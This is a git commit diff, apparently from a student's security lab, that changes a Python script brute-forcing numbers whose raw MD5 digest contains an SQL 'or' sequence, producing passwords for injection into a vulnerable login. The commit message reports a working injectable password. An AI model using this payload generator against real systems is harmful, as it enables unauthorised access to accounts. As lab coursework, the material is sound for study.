bc973a4e44a9a9ba3dd78a3ab9b3d8da8640f571
juda8901 <juda8901@colorado.edu>
2021-02-28 22:31:12 -0700

    commented some stuff out and instantly got a working password to inject

--- sql/sql_2-src/sql_2.py
+++ sql/sql_2-src/sql_2.py
@@ -2,14 +2,18 @@ from hashlib import md5
 import random
 import string
 
+f = open("possible_pass.txt", "a")
+
 random.seed()
 
 i = 0
 while(1):
     str_numbers = ''
     for j in range(4):
-        x = random.randint(0, 2147483647)
+        x = random.randint(0, 32767)
         str_numbers = str_numbers + str(x)
+    
+    # f.write(str_numbers + "\n")
 
     # print(str_numbers)
     if(i % 100000 == 0):
@@ -26,44 +30,51 @@ while(1):
     match3 = digest.find(b"'Or'")
     match4 = digest.find(b"'oR'")
     match5 = digest.find(b"'or'")
+
+    # for some reason the code to check if the characters were followed by a number caused the code to take forever. After reaching 1 billion+ checks I commented out the checks and was just going to do it manually
     if match1 >= 0:
-        index = match1 + 4
+        # index = match1 + 4
         # print(digest[index])
-        if digest[index] > 48 and digest[index] < 58:
-            print(str_numbers)
-            print(digest)
-            print("necessary characters found at index: " + str(match1))
-            exit()
+        # if index < len(digest) and digest[index] > 48 and digest[index] < 58:
+        print(str_numbers)
+        print(digest)
+        # print("necessary characters found at index: " + str(match1))
+        f.write(str_numbers + "\n")
+        # exit()
     if match2 >= 0:
-        index = match2 + 4
+        # index = match1 + 4
         # print(digest[index])
-        if digest[index] > 48 and digest[index] < 58:
-            print(str_numbers)
-            print(digest)
-            print("necessary characters found at index: " + str(match2))
-            exit()
+        # if index < len(digest) and digest[index] > 48 and digest[index] < 58:
+        print(str_numbers)
+        print(digest)
+        # print("necessary characters found at index: " + str(match1))
+        f.write(str_numbers + "\n")
+        # exit()
     if match3 >= 0:
-        index = match3 + 4
+        # index = match1 + 4
         # print(digest[index])
-        if digest[index] > 48 and digest[index] < 58:
-            print(str_numbers)
-            print(digest)
-            print("necessary characters found at index: " + str(match3))
-            exit()
+        # if index < len(digest) and digest[index] > 48 and digest[index] < 58:
+        print(str_numbers)
+        print(digest)
+        # print("necessary characters found at index: " + str(match1))
+        f.write(str_numbers + "\n")
+        # exit()
     if match4 >= 0:
-        index = match4 + 4
+        # index = match1 + 4
         # print(digest[index])
-        if digest[index] > 48 and digest[index] < 58:
-            print(str_numbers)
-            print(digest)
-            print("necessary characters found at index: " + str(match4))
-            exit()
+        # if index < len(digest) and digest[index] > 48 and digest[index] < 58:
+        print(str_numbers)
+        print(digest)
+        # print("necessary characters found at index: " + str(match1))
+        f.write(str_numbers + "\n")
+        # exit()
     if match5 >= 0:
-        index = match5 + 4
+        # index = match1 + 4
         # print(digest[index])
-        if digest[index] > 48 and digest[index] < 58:
-            print(str_numbers)
-            print(digest)
-            print("necessary characters found at index: " + str(match5))
-            exit()
+        # if index < len(digest) and digest[index] > 48 and digest[index] < 58:
+        print(str_numbers)
+        print(digest)
+        # print("necessary characters found at index: " + str(match1))
+        f.write(str_numbers + "\n")
+        # exit()
     
